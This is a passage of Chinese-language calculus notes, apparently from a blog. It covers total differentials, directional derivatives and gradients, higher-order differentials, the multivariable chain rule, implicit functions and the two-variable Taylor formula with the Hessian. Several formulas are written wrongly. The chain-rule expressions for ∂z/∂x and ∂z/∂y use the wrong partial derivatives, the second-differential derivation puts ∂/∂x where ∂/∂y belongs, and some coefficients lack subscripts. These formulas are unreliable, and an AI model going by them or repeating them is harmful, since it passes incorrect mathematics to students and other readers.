\]</span> ​ 证毕</p>
</blockquote>
<p>​ f的所有偏导数均在点<span
class="math inline">\((x_0,y_0)\)</span>处连续时，f必在点<span
class="math inline">\((x_0,y_0)\)</span>处可微，但可微函数的偏导数未必连续.</p>
<h2 id="n元函数的全微分">n元函数的全微分</h2>
<p>​ 设n元函数<span
class="math inline">\(u=f(\mathbf{x})=f(x_1,x_2,\cdots,x_n)\)</span>在点<span
class="math inline">\(\mathbf{x_0}=(x_{0.1},x_{0.2},\cdots,x_{0.n})\in
R^n\)</span>的邻域<span class="math inline">\(U(\mathbf{x_0})\subseteq
R^n\)</span>内有定义，如果<span class="math inline">\(\forall
\mathbf{x=x_0+\Delta x\in}U(\mathbf{x_0})\)</span>,存在一组与<span
class="math inline">\(\mathbf{\Delta x}=(\mathbf{\Delta
x_1,\cdots,\Delta x_n})\)</span>无关的常数<span
class="math inline">\(a_1,a_2,\cdots ,a_n\)</span>，使得函数f在<span
class="math inline">\(\mathbf{x_0}\)</span>处的改变量 <span
class="math display">\[
\Delta u=f(\mathbf{x_0+\Delta x})-f(\mathbf{x_0})
\]</span> ​ 可表示为： <span class="math display">\[
\Delta u=a_1\Delta \mathbf{x_1}+\cdots +a_n\Delta \mathbf{x_n}+o(\rho)
\]</span> ​ 其中<span class="math inline">\(o(\rho)\)</span>是当<span
class="math inline">\(\rho=\left \| \Delta x \right \| \to
0\)</span>时关于<span
class="math inline">\(\rho\)</span>的高阶无穷小，则称<span
class="math inline">\(f\)</span>在点<span
class="math inline">\(\mathbf{x_0}\)</span>可微，且称关于<span
class="math inline">\(\Delta
x_1,\cdots,\Delta            x_n\)</span>的线性函数 <span
class="math display">\[
a_1\mathbf{\Delta x_1}+\cdots+a\mathbf{\Delta x_n}
\]</span> ​ 为<span class="math inline">\(f\)</span>在<span
class="math inline">\(\mathbf{x_0}\)</span>处全微分，记为<span
class="math inline">\(df(\mathbf{x_0})\)</span>，或<span
class="math inline">\(du |_{x=x_0}\)</span>，即 <span
class="math display">\[
df(\mathbf{x_0})=a\mathbf{\Delta x_1}+\cdots+a_n\mathbf{\Delta x_n}
\]</span> ​ 同二元函数一样，常记<span
class="math inline">\(\mathbf{x_i}=dx_i\)</span>，于是<span
class="math inline">\(f\)</span>的全微分也常写成： <span
class="math display">\[
df(\mathbf{x_0})=\sum _{i=1} ^n a_idx_i
\]</span></p>
<h2 id="近似计算和误差估计">近似计算和误差估计</h2>
<p>​ 局部线性逼近（局部线性化）</p>
<p>​ 例题：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230419183945211.png" /></p>
<p>​ 误差估计：</p>
<p>​ 乘积的相对误差等于各个因子的相对误差之和</p>
<p>​ 商的相对误差等于分子和分母的相对误差之和</p>
<h1 id="方向导数和梯度">方向导数和梯度</h1>
<h2 id="方向导数">方向导数</h2>
<p>​ 设点<span class="math inline">\(\mathbf{x_0}\in
R^2,\mathbf{l}\)</span>是平面上的某一向量，其单位向量记为<span
class="math inline">\(\mathbf{e_l},f:U(\mathbf{x_0})\subseteq R^2 \to
R\)</span>是一个二元函数.我们讨论<span
class="math inline">\(f\)</span>在点<span
class="math inline">\(\mathbf{x_0}\)</span>处沿<span
class="math inline">\(l\)</span>方向的变化率（记作<span
class="math inline">\(\frac{\partial f}{\partial
\mathbf{l}}|_{\mathbf{x_0}}\)</span>）.过点<span
class="math inline">\(\mathbf{x_0}\)</span>作与<span
class="math inline">\(\mathbf{l}\)</span>平行的直线L，它的方程是 <span
class="math display">\[
\mathbf{x=x_0+}t\mathbf{e_l},t\in R
\]</span> ​ <span class="math inline">\(f(\mathbf{x})\)</span>在点<span
class="math inline">\(\mathbf{(x_0)}\)</span>处沿<span
class="math inline">\(l\)</span>方向的变化率，就是当点<span
class="math inline">\(x\)</span>在直线<span
class="math inline">\(\mathbf l\)</span>上变动时<span
class="math inline">\(f(x)\)</span>在点<span
class="math inline">\(\mathbf{x_0}\)</span>处的变化率.在点<span
class="math inline">\(\mathbf{x_0}\)</span>和<span
class="math inline">\(\mathbf{e_l}\)</span>固定的情况下，当<span
class="math inline">\(\mathbf{x}\)</span>在L上变动时，函数 <span
class="math display">\[
f(\mathbf{x})=f(\mathbf{x_0+}t\mathbf{e_l})
\]</span> ​ 实际上是自变量t的一元函数，记作 <span class="math display">\[
F(t)=f(\mathbf{x_0+}t\mathbf{e_l})
\]</span> ​ 因此，<span
class="math inline">\(f(\mathbf{x})\)</span>在点<span
class="math inline">\(\mathbf{(x_0)}\)</span>处沿<span
class="math inline">\(l\)</span>方向的变化率也就是一元函数F(t)在t=0处的导数，即
<span class="math display">\[
\frac{\partial f}{\partial \mathbf {l} }|_{ \mathbf{x_0}
}=\frac{dF(t)}{dt}|_{ {t=0} }=\lim _{t \to 0}\frac{F(t)-F(0)}{t}=\lim
_{t \to 0}\frac{f(\mathbf{x_0+}t\mathbf{e_l})-f(\mathbf{x_0})}{t}
\]</span> ​ 由此，我们给出以下定义：</p>
<p>​ 设点<span class="math inline">\(\mathbf{x_0}\in R^2\)</span>,<span
class="math inline">\(\mathbf
l\)</span>是平面上的某一向量，与l同向的单位向量为<span
class="math inline">\(\mathbf{e_l}\)</span>，二元函数f定义在<span
class="math inline">\(\mathbf{x_0}\)</span>的邻域<span
class="math inline">\(U(\mathbf{x_0})\subseteq R^2\)</span>内，在<span
class="math inline">\(U(\mathbf{x_0})\)</span>内让自变量<span
class="math inline">\(\mathbf{x}\)</span>由<span
class="math inline">\(\mathbf{x_0}\)</span>沿与<span
class="math inline">\(\mathbf{e_l}\)</span>的平行的直线变到<span
class="math inline">\(\mathbf{x_0+}t\mathbf{e_l}\)</span>,从而函数值有对应的改变量<span
class="math inline">\(f(\mathbf{x_0+}t\mathbf{e_l})-f(\mathbf{x_0})\)</span>.若
<span class="math display">\[
\lim _{t \to 0}\frac{f(\mathbf{x_0+}t\mathbf{e_l})-f(\mathbf{x_0})}{t}
\]</span> ​ 存在，则称该极限值为f在点<span
class="math inline">\(\mathbf{x_0}\)</span>处沿<span
class="math inline">\(\mathbf l\)</span>方向的方向导数，记作<span
class="math inline">\(\frac{\partial f(\mathbf{x_0})}{\partial
\mathbf{l}}|_{\mathbf{x_0}}\)</span>，或<span
class="math inline">\(\frac{\partial f}{\partial
\mathbf{l}}|_{\mathbf{x_0}}\)</span>，即 <span class="math display">\[
\frac{\partial f}{\partial \mathbf{l}}|_{\mathbf{x_0}}=\lim _{t \to
0}\frac{f(\mathbf{x_0+}t\mathbf{e_l})-f(\mathbf{x_0})}{t}
\]</span></p>
<ol type="1">
<li><p>定义中的t的绝对值就是两点<span
class="math inline">\(\mathbf{x_0}\)</span>与<span
class="math inline">\(\mathbf{x_0+}t\mathbf{e_l}\)</span>之间的距离d，事实上，注意到<span
class="math inline">\(\mathbf{e_l}\)</span>单位向量，于是有 <span
class="math display">\[
d=\left \| (\mathbf{x_0+}t\mathbf{e_l})-\mathbf{x_0} \right \|=\left \|
t\mathbf{e_l} \right \| =|t|\| \mathbf{e_l} \|=|t|
\]</span></p></li>
<li><p>方向导数实际上是函数f在<span
class="math inline">\(\mathbf{x_0}\)</span>处沿l方向关于距离的变化率</p></li>
</ol>
<h3 id="几何意义-1">几何意义</h3>
<p>​ 过直线<span
class="math inline">\(L:\mathbf{x=x_0+}t\mathbf{e_l}\)</span>作平行于z轴的平面<span
class="math inline">\(\pi\)</span>，它与曲面<span
class="math inline">\(z=f(x,y)\)</span>所交的曲线记为C.取一点<span
class="math inline">\(P_0\)</span>，曲线C在<span
class="math inline">\(P_0\)</span>仅有唯一的切线T，它关于l方向的斜率就是方向导数<span
class="math inline">\(\frac{\partial f}{\partial
\mathbf{l}}|_{\mathbf{x_0}}\)</span></p>
<h3 id="方向导数存在条件及计算公式">方向导数存在条件及计算公式</h3>
<p>​ 若<span class="math inline">\(f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>可微，则函数f在点<span
class="math inline">\((x_0,y_0)\)</span>沿任意l方向的方向导数均存在，且
<span class="math display">\[
\frac{\partial f}{\partial
\mathbf{l}}|_{\mathbf{(x_0,y_0)}}=f_x(x_0,y_0)\cos \alpha
+f_y(x_0,y_0)\cos \beta
\]</span> ​ 其中<span
class="math inline">\(l\)</span>方向上的单位向量是<span
class="math inline">\(\mathbf{e_l}=(\cos\alpha,\cos \beta)\)</span></p>
<blockquote>
<p>证明：</p>
<p>​ 当<span class="math inline">\(f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>可微时，函数<span
class="math inline">\(f(x,y)\)</span>在<span
class="math inline">\((x_0,y_0)\)</span>处的改变量为： <span
class="math display">\[
f(x_0+\Delta x,y_0+\Delta y)-f(x_0,y_0)=a_1 \Delta x+a _2 \Delta
y+o(\rho)
\]</span> ​ 其中<span
class="math inline">\(a_1=f_x(x_0,y_0)\)</span>,<span
class="math inline">\(a=f_y(x_0,y_0)\)</span>.取<span
class="math inline">\(\Delta x=t\cos \alpha,\Delta y=t\cos
\beta,\mathbf{x_0}=(x_0,y_0)\)</span>,则有<span
class="math inline">\(\rho=\sqrt{\Delta x^2+\Delta
y^2}=|t|\)</span>,且</p>
<p><span class="math display">\[\begin{align*}

&amp;f(x_0+t\cos \alpha,y_0+t\cos \beta)-f(x_0,y_0)\\

&amp;=f(\mathbf{x_0}+t\mathbf{e_l})-f(\mathbf{x_0})=a_1t\cos \alpha+a_2
t\cos \beta+o(\rho)

\end{align*}\]</span></p>
<p>于是由方向导数的定义式有：</p>
<p><span class="math display">\[\begin{align*}
\frac{\partial f}{\partial \mathbf{l}}|_{\mathbf{(x_0,y_0)}}&amp;=\lim
_{t\to 0}\frac{f(\mathbf{x_0+}t\mathbf{e_l})-f(\mathbf{x_0})}{t}\\
&amp;=\lim _{t\to 0}(a_1\cos
\alpha+a_2\cos\beta+\frac{o(\rho)}{t})=a_1\cos \alpha+a_2\cos \beta
+\lim _{t \to 0}\frac{o(|t|)}{t}\\
&amp;=a_1\cos \alpha+a_2 \cos \beta
\end{align*}\]</span></p>
<p>​ 证毕</p>
</blockquote>
<h2 id="梯度">梯度</h2>
<p>​ 梯度即某点最大的方向导数</p>
<p>​ 定义：设二元函数<span
class="math inline">\(z=f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>处可微，则<span
class="math inline">\(f\)</span>在该点的梯度一定存在，并且： <span
class="math display">\[
\mathbf{grad}f(x_0,y_0)=f_x(x_0,y_0)\mathbf{i}+f_y(x_0,y_0)\mathbf j
\]</span></p>
<blockquote>
<p>证明：</p>
<p>​ <span class="math inline">\(f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>处可微，则<span
class="math inline">\(f\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>处沿<span
class="math inline">\(\mathbf{e_l}=(\cos \alpha,\cos \beta
)\)</span>的方向导数必定存在，并且 <span class="math display">\[
\frac{\partial f}{\partial
\mathbf{l}}|_{\mathbf{(x_0,y_0)}}=f_x(x_0,y_0)\cos
\alpha+f_y(x_0,y_0)\cos \beta
\]</span> ​ 作向量<span class="math inline">\(\mathbf
g=(f_x(x_0,y_0),f_y(x_0,y_0))\)</span>,下面证明<span
class="math inline">\(\mathbf g\)</span>就是<span
class="math inline">\(f\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>处的梯度</p>
<p>​ 由于： <span class="math display">\[
\frac{\partial f}{\partial \mathbf{l}}|_{\mathbf{(x_0,y_0)}}=&lt;\mathbf
g,\mathbf {e_l}&gt;=\|\mathbf g\|\cos (\mathbf g,\mathbf{e_l})\le
\|\mathbf g\|
\]</span> ​ 方向导数<span class="math inline">\(\frac{\partial
f}{\partial \mathbf{l}}|_{\mathbf{(x_0,y_0)}}\)</span>等于梯度在<span
class="math inline">\(\mathbf l\)</span>方向的<strong>投影</strong></p>
<p>​ 所以，当<span class="math inline">\(\cos (\mathbf
g,\mathbf{e_l})=1\)</span>时，即<span
class="math inline">\(\mathbf{e_l}\)</span>与<span
class="math inline">\(\mathbf g\)</span>同向时，<span
class="math inline">\(\frac{\partial f}{\partial
\mathbf{l}}|_{\mathbf{(x_0,y_0)}}=\|\mathbf g\|\)</span>.</p>
<p>​ 也就是说，向量<span class="math inline">\(\mathbf
g\)</span>的方向是函数<span class="math inline">\(f\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>处取得方向导数最大值的方向，<span
class="math inline">\(\mathbf g\)</span>的模就是<span
class="math inline">\(f\)</span>在该点方向导数的最大值，因此： <span
class="math display">\[
\mathbf g=f_x(x_0,y_0)\mathbf{i}+f_y(x_0,y_0)\mathbf
j=\mathbf{grad}f(x_0,y_0)
\]</span> ​</p>
</blockquote>
<p>​ 函数<span class="math inline">\(f\)</span>在<span
class="math inline">\((x_0,y_0)\)</span>处的梯度可用<strong>nabla算符</strong><span
class="math inline">\(\nabla\)</span>表示（也称向量微分算子），记作<span
class="math inline">\(\nabla f(x_0,y_0)\)</span>其中符号<span
class="math inline">\(\nabla =(\frac{\partial f(x_0,y_0)}{\partial
x},\frac{\partial f(x_0,y_0)}{\partial
y}  )\)</span>,它本身并无意义，仅当将<span
class="math inline">\(\nabla\)</span>作用于函数<span
class="math inline">\(f\)</span>后表示如下向量 <span
class="math display">\[
\nabla f(x_0,y_0)=\left( \frac{\partial f(x_0,y_0)}{\partial
x},\frac{\partial f(x_0,y_0)}{\partial y} \right)
\]</span></p>
<h2 id="n元函数的方向导数与梯度">n元函数的方向导数与梯度</h2>
<p>​ 设<span class="math inline">\(\mathbf {x_0}\)</span>是<span
class="math inline">\(R^n\)</span>中的一个点，<span
class="math inline">\(f\)</span>为定义在<span
class="math inline">\(\mathbf{x_0}\)</span>的邻域的<span
class="math inline">\(U(\mathbf{x_0})\)</span>内的一个n元函数，<span
class="math inline">\(\mathbf{e_l}\)</span>为<span
class="math inline">\(R^n\)</span>中的一个单位向量，则n元函数<span
class="math inline">\(f(\mathbf x)\)</span>在点<span
class="math inline">\(\mathbf {x_0}\)</span>沿<span
class="math inline">\(\mathbf {e_l}\)</span>方向的方向导数定义为 <span
class="math display">\[
\frac{\partial f}{\partial \mathbf{l}}|_{\mathbf{x_0}}=\lim _{t \to
0}\frac{f(\mathbf{x_0+}t\mathbf{e_l})-f(\mathbf{x_0})}{t}
\]</span> 当<span class="math inline">\(f\)</span>在点<span
class="math inline">\(\mathbf {x_0}\)</span>可微时，<span
class="math inline">\(f\)</span>在点<span class="math inline">\(\mathbf
{x_0}\)</span>沿任意<span class="math inline">\(\mathbf
l\)</span>方向的方向导数都存在，并且有如下计算公式： <span
class="math display">\[
\frac{\partial f}{\partial \mathbf{l}}|_{\mathbf{x_0}}=\sum _{k=1}
^n\frac{\partial f(\mathbf {x_0}) }{\partial x_k}\cos \alpha _k
\]</span> ​ 其中<span class="math inline">\(\cos \alpha_1,\cos \alpha_2
,\cdots ,\cos \alpha _n\)</span>为向量<span
class="math inline">\(\mathbf l\)</span>的方向余弦.</p>
<p>​ 梯度计算公式： <span class="math display">\[
\mathbf{grad}f(\mathbf {x_0} )=\nabla f(\mathbf {x_0})=\left (
\frac{\partial f }{\partial x_1},\frac{\partial f }{\partial
x_2},\cdots,\frac{\partial f }{\partial x_n}\right )
\]</span> ​ 求梯度实际上就是求偏导数，故梯度的运算法则类似于求导法则</p>
<p>​</p>
<h1 id="高阶偏导数和高阶全微分">高阶偏导数和高阶全微分</h1>
<h2 id="二阶偏导数">二阶偏导数</h2>
<p>​ 若<span
class="math inline">\(z=f(x,y)\)</span>在区域D内的两个偏导函数 <span
class="math display">\[
z_x=\frac{\partial z}{\partial x} =f_x(x,y),\space z_y=\frac{\partial
z}{\partial y}=f_y(x,y)
\]</span> ​ 在D内某点x处的偏导数仍存在，则这两个函数<span
class="math inline">\(f_x(x,y)\)</span>与<span
class="math inline">\(f_y(x,y)\)</span>的偏导数称为函数<span
class="math inline">\(f(x,y)\)</span>的<strong>二阶偏导数</strong>.</p>
<p>​ 按照求导次序的不同，二元函数z有四种不同的偏导数</p>
<p>​ 当<span class="math inline">\(f_{xy}\)</span>和<span
class="math inline">\(f_{yx}\)</span>都在点P连续时，则在点P处有<span
class="math inline">\(f_{xy}=f_{yx}\)</span>，即<strong>二阶混合偏导数与求导次序无关</strong></p>
<p>​</p>
<h2 id="二阶全微分">二阶全微分</h2>
<p>​ 当二元函数<span class="math inline">\(u=f(x,y)\)</span>在区域<span
class="math inline">\(\Omega \subseteq
R^2\)</span>内每一点均可微时，则在<span
class="math inline">\(\Omega\)</span>内u的全微分为： <span
class="math display">\[
du=\left \langle \nabla f,\Delta \mathbf x \right \rangle=\frac{\partial
f}{\partial x}dx+\frac{\partial f}{\partial y}dy
\]</span> ​
如果把dx,dy看作固定不变，那么du就是(x,y)的函数.如果函数du仍在<span
class="math inline">\(\Omega\)</span>内可微，那么把这个函数du再求全微分，其结果称为u的<strong>二阶全微分</strong>，记作<span
class="math inline">\(d^2u=d(du)\)</span> <span class="math display">\[
\begin{align*}
d^2u=d(du)&amp;=\frac{\partial }{\partial
x}(f_xdx+f_ydy)dx+\frac{\partial}{\partial x}(f_xdx+f_ydy)dy\\
&amp;=f_{xx}dx^2+2f_{xy}dxdy+f_{yy}dy^2\\
&amp;=\frac{\partial^2 }{\partial x^2}dx^2+2\frac{\partial^2 }{\partial
x \partial y}dxdy+\frac{\partial ^2}{\partial y^2}dy^2\\
&amp;=\left ( \frac{\partial }{\partial x}dx+\frac{\partial }{\partial
x}dy\right )^2
\end{align*}
\]</span> ​ 二阶全微分也可简洁地写成，按二项式定理展开 <span
class="math display">\[
d^2u=\left ( \frac{\partial }{\partial x}dx+\frac{\partial }{\partial
x}dy\right )^2f
\]</span></p>
<h2 id="多元复合函数的偏导数和全微分">多元复合函数的偏导数和全微分</h2>
<p>​ 若<span class="math inline">\(u=u(x,y)\)</span>和<span
class="math inline">\(v=v(x,y)\)</span>均在点<span
class="math inline">\((x,y)\)</span>处可微，且函数<span
class="math inline">\(z=f(u,v)\)</span>在对应的点<span
class="math inline">\((u,v)\)</span>处可微，则复合函数<span
class="math inline">\(z=f[u(x,y),v(x,y)]\)</span>在点<span
class="math inline">\((x,y)\)</span>处也必可微，且其全微分为： <span
class="math display">\[
dz=(\frac{\partial z}{\partial u}\frac{\partial u}{\partial
x}+\frac{\partial z}{\partial v}\frac{\partial v}{\partial
x})dx+(\frac{\partial z}{\partial u}\frac{\partial u}{\partial
y}+\frac{\partial z}{\partial v}\frac{\partial v}{\partial y})dy
\]</span> ​ 求导有如下链式法则： <span class="math display">\[
\frac{\partial z}{\partial x}=\frac{\partial z}{\partial
u}\frac{\partial u}{\partial x}+\frac{\partial z}{\partial
v}\frac{\partial u}{\partial y}
\]</span></p>
<p><span class="math display">\[
\frac{\partial z}{\partial y}=\frac{\partial z}{\partial
u}\frac{\partial z}{\partial y}+\frac{\partial z}{\partial
v}\frac{\partial z}{\partial y}
\]</span></p>
<p>​ 推广到m个中间变量，n个自变量构成的一般复合函数</p>
<p>​ 设函数： <span class="math display">\[
v=f(u_1,u_2,\cdots,u_m)及u_i=u_i(x_1,x_2,\cdots,x_n),i=1,2,\cdots,m
\]</span> ​ 都可微，则复合函数<span class="math inline">\(y=f(u_1(\mathbf
x),u_2(\mathbf x),\cdots,u_n(\mathbf x))\)</span>也可微，其中<span
class="math inline">\(\mathbf x=(x_1,x_2,\cdots,x_n)\)</span>，且有
<span class="math display">\[
dy=\frac{\partial y}{\partial x_1}dx_1+\frac{\partial y}{\partial
x_2}dx_2+\cdots+\frac{\partial y}{\partial x_n}dx_n
\]</span> ​ 其中： <span class="math display">\[
\frac{\partial y}{\partial x_j}=\frac{\partial y}{\partial
u_1}\frac{\partial u_1}{\partial x_j}+\frac{\partial y}{\partial
u_2}\frac{\partial u_2}{\partial x_j}+\cdots+\frac{\partial y}{\partial
u_m}\frac{\partial u_m}{\partial x_j},j=1,2,\cdots,n
\]</span> ​ 多元函数的复合有多种情况：</p>
<ol type="1">
<li><p>设<span class="math inline">\(z=f(u,v),u=\varphi(x),v=\psi
(x)\)</span>均可微，则复合函数<span class="math inline">\(z=f[\varphi
(x),\psi (x)]\)</span>是x的一元函数 <span class="math display">\[
\frac{dz}{dx}=\frac{\partial z}{\partial u}\frac{du}{dx}+\frac{\partial
z}{\partial v}\frac{dv}{dx}
\]</span> 它称为复合函数z对x的全导数</p></li>
<li><p>设<span class="math inline">\(w=f(u),u=\varphi
(x,y,z)\)</span>均可微，则复合函数<span
class="math inline">\(w=f[u(x,y,z)]\)</span>可微，它有一个中间变量，有三个自变量
<span class="math display">\[
\frac{\partial w}{\partial x}=\frac{dw}{du}\frac{\partial u}{\partial
x},\frac{\partial w}{\partial y}=\frac{dw}{du}\frac{\partial u}{\partial
y},\frac{\partial w}{\partial z}=\frac{dw}{du}\frac{\partial u}{\partial
z}
\]</span> ​</p></li>
<li><p>设<span
class="math inline">\(u=f(x,y,z),z=\varphi(x,y)\)</span>均可微，则复合函数<span
class="math inline">\(u=f[x,y,z(x,y)]\)</span>可微，它有三个中间变量，两个自变量
<span class="math display">\[
\frac{\partial u}{\partial x}=\frac{\partial f}{\partial
x}+\frac{\partial f}{\partial z}\frac{\partial z}{\partial
x},\frac{\partial u}{\partial y}=\frac{\partial f}{\partial
y}+\frac{\partial f}{\partial z}\frac{\partial z}{\partial y}
\]</span></p></li>
</ol>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230420145710153.png" /></p>
<p>​ <strong>一阶全微分形式不变性</strong></p>
<blockquote>
<p>​ 证明：</p>
<p>​ 设有函数<span class="math inline">\(z=f(u,v)\)</span>与<span
class="math inline">\(u=\varphi(x,y),v=\psi(x,y)\)</span>复合.若<span
class="math inline">\(\varphi,\psi\)</span>在点<span
class="math inline">\((x,y)\)</span>处可微，且<span
class="math inline">\(f\)</span>在与<span
class="math inline">\((x,y)\)</span>相应的<span
class="math inline">\((u,v)\)</span>处可微，则复合函数的全微分为： <span
class="math display">\[
dz=\frac{\partial z}{\partial x}dx+\frac{\partial z}{\partial y}dy
\]</span> ​ 由复合函数求导法则： <span class="math display">\[
\frac{\partial z}{\partial x}=\frac{\partial z}{\partial
u}\frac{\partial u}{\partial x}+\frac{\partial z}{\partial
v}\frac{\partial v}{\partial x},
\frac{\partial z}{\partial y}=\frac{\partial z}{\partial
u}\frac{\partial u}{\partial y}+\frac{\partial z}{\partial
v}\frac{\partial v}{\partial y}
\]</span> ​ 整理得到： <span class="math display">\[
dz=\frac{\partial z}{\partial u}(\frac{\partial u}{\partial
x}dx+\frac{\partial u}{\partial y}dy)+\frac{\partial z}{\partial
v}(\frac{\partial v}{\partial x}dx+\frac{\partial v}{\partial y}dy)
\]</span> ​ 而<span class="math inline">\(\frac{\partial u}{\partial
x}dx+\frac{\partial u}{\partial y}dy=du,\frac{\partial v}{\partial
x}dx+\frac{\partial v}{\partial y}dy=dv\)</span></p>
<p>​ 所以有： <span class="math display">\[
dz=\frac{\partial z}{\partial u}du+\frac{\partial z}{\partial v}dv
\]</span></p>
<p><span class="math display">\[
\frac{\partial z}{\partial x}dx+\frac{\partial z}{\partial
y}dy=\frac{\partial z}{\partial u}du+\frac{\partial z}{\partial v}dv
\]</span></p>
</blockquote>
<p>​ 上面的全微分形式与把函数<span
class="math inline">\(z=f(u,v)\)</span>中的中间变量<span
class="math inline">\(u,v\)</span>看作是自变量时的全微分形式的完全一样的，我们把这一性质成为<strong>一阶全微分形式不变性</strong></p>
<h2 id="隐函数微分法determined-by-1-equation">隐函数微分法（determined
by 1 equation）</h2>
<p>​ 一般地，设有方程 <span class="math display">\[
F(x_1,\cdots,x_n,y)=0
\]</span> ​ 如果存在一个n元函数<span
class="math inline">\(y=\varphi(\mathbf x),\mathbf x=(x_1,\cdots,x_n)\in
\Omega \subseteq R^n(\Omega 为一区域)\)</span>使得将<span
class="math inline">\(y=\varphi (\mathbf x)\)</span>代入后成为恒等式
<span class="math display">\[
F(x_1,\cdots,x_n,\varphi(x_1,\cdots,x_n)) \equiv 0
\]</span> ​ 则称<span class="math inline">\(y=\varphi(\mathbf
x)\)</span>是由上述方程确定的隐函数</p>
<h3 id="隐函数存在定理">隐函数存在定理</h3>
<p>​ 如果二元函数<span class="math inline">\(F(x,y)\)</span>满足：</p>
<ol type="1">
<li><span class="math inline">\(F(x_0,y_0)=0\)</span></li>
<li>在点<span
class="math inline">\((x_0,y_0)\)</span>的某邻域中有连续的偏导数</li>
<li><span class="math inline">\(F_y(x_0,y_0)\neq 0\)</span></li>
</ol>
<p>​ 则方程<span class="math inline">\(F(x,y)=0\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>的某一邻域中唯一确定了一个具有连续导数的函数<span
class="math inline">\(y=f(x)\)</span>，它满足<span
class="math inline">\(y_0=f(x_0)\)</span>，及<span
class="math inline">\(F(x,f(x))\equiv 0\)</span>并且 <span
class="math display">\[
\frac{dy}{dx}=-\frac{F_x}{F_y}
\]</span> ​
计算公式的推导就是对满足的方程进行求导，然后解一个方程，多元函数也是同理</p>
<h1 id="多元函数的泰勒公式和极值问题">多元函数的泰勒公式和极值问题</h1>
<p>​ 设二元函数<span class="math inline">\(z=f(x,y)\)</span>在点<span
class="math inline">\((x_0,y_0)\)</span>的某邻域<span
class="math inline">\(U(x_0,y_0)\)</span>内连续的二阶偏导数.<span
class="math inline">\((x_0+\Delta x,y_0+\Delta y)\in
U(x_0,y_0)\)</span>，则存在<span class="math inline">\(\theta \in
(0,1)\)</span>使得 <span class="math display">\[
f(x_0+\Delta x,y_0+\Delta y)=f(x_0,y_0)+f_x(x_0,y_0)\Delta
x+f_y(x_0,y_0)\Delta y+R_1
\]</span> ​ 其中 <span class="math display">\[
R_1=\frac{1}{2!}(f_{xx}\Delta x^2+2f_{xy}\Delta x \Delta y +f_{yy}\Delta
y^2)|_{(x_0+\theta \Delta ,y_0+\theta \Delta)}
\]</span> ​
二元函数Tylor公式证明的基本思路也是<strong>引入参数t</strong>，将二元函数化为t的一元函数<span
class="math inline">\(\varphi(t)=f(x_0+t\Delta x,y_0+t\Delta
y)\)</span>，要使证明的公式中的各项<span
class="math inline">\((f(x_0,y_0),f_x(x_0,y_0),f_y(x_0,y_0)及二阶偏导数)\)</span>可利用一元函数<span
class="math inline">\(\varphi
(t)\)</span>的对应项来表示，并利用一元函数<span
class="math inline">\(\varphi(t)\)</span>的Taylor公式来证明</p>
<p>​ 将上述式子写成矩阵形式</p>
<blockquote>
<p>​ 令<span class="math inline">\(\Delta
x_0=(x_0,y_0)^T,\mathbf{x_0+\Delta x}=(x_0+\Delta x,y_0+\Delta
y)^T\)</span>,则<span class="math inline">\(f(x_0+\Delta x,y_0+\Delta
y)=f(x_0,y_0)+f_x(x_0,y_0)\Delta x+f_y(x_0,y_0)\Delta
y+R_1\)</span>中的一阶导数部分可以写成二元函数<span
class="math inline">\(f\)</span>的梯度向量<span
class="math inline">\(\nabla
f(x_0,y_0)=(f_x(x_0,y_0),f_y(x_0,y_0))\)</span>与向量<span
class="math inline">\(\mathbf{\Delta x=(\Delta x,\Delta
y)}^T\)</span>的内积形式，即 <span class="math display">\[
(f_x\Delta x+f_y\Delta y)|_{(x_0,y_0)}=\left \langle \nabla
f(x_0,y_0),\mathbf {\Delta x} \right \rangle
\]</span> ​ 而<span class="math inline">\(R_1=\frac{1}{2!}(f_{xx}\Delta
x^2+2f_{xy}\Delta x \Delta y +f_{yy}\Delta y^2)|_{(x_0+\theta \Delta
,y_0+\theta \Delta)}\)</span>是关于<span class="math inline">\(\Delta
x,\Delta y\)</span>的一个二次型，其系数矩阵为 <span
class="math display">\[
\mathbf {H_f(x_0+\theta \Delta x)}=\begin{bmatrix}
f_{xx} &amp; f_{xy}\\
f_{xy} &amp; f_{yy}
\end{bmatrix} \bigg|_\mathbf{(x_0+\theta \Delta x)}
\]</span> ​ 称为函数<span class="math inline">\(f\)</span>在<span
class="math inline">\(\mathbf{x_0+\theta \Delta
x}\)</span>处的<strong>Hesse矩阵</strong>,故二次型的矩阵形式为 <span
class="math display">\[
R_1=\frac{1}{2!}(\mathbf {\Delta x})^T\mathbf{H_f(x_0+\theta \Delta
x)\Delta x}
\]</span> ​ 这样，我们就可以把Taylor公式写成如下的矩阵形式 <span
class="math display">\[
f(\mathbf{x_0+\Delta x})=f(\mathbf{x_0}+\left \langle \nabla f(\mathbf
{x_0} ),\mathbf {\Delta x_0} \right \rangle +\frac{1}{2!}(\mathbf
{\Delta x})^T\mathbf{H_f(x_0+\theta \Delta x)\Delta x}
\]</span> ​ 由于<span class="math inline">\(\mathbf
{H_f}\)</span>的元素由<span
class="math inline">\(f\)</span>的二阶偏导数构成，而<span
class="math inline">\(f\)</span>的所有二阶偏导数均连续，可以证明 <span
class="math display">\[
(\mathbf {\Delta x})^T\mathbf{H_f(x_0+\theta \Delta x)\Delta x}=(\mathbf
{\Delta x})^T\mathbf{H_f(x_0)\Delta x}+o(\|\mathbf{\Delta x} \|^2)
\]</span> ​ 由此得到<span
class="math inline">\(f(\mathbf{x})\)</span>在<span
class="math inline">\(\mathbf
{x_0}\)</span>处带有Peano余项的二阶Taylor公式： <span
class="math display">\[
f(\mathbf{x_0+\Delta x})=f(\mathbf {x_0})+\left \langle \nabla f(\mathbf
{x_0},\mathbf {\Delta x}) \right \rangle +\frac{1}{2!}(\mathbf {\Delta
x})^T\mathbf{H_f(x_0)\Delta x}+o(\|\mathbf{\Delta x} \|^2)
\]</span></p>
</blockquote>
<h3 id="类函数">类函数</h3>
<p>​ 定义：设<span class="math inline">\(f(x)\)</span>是定义在区域<span
class="math inline">\(\Omega \subseteq R^n\)</span>内的n元函数，若<span
class="math inline">\(f\)</span>在<span
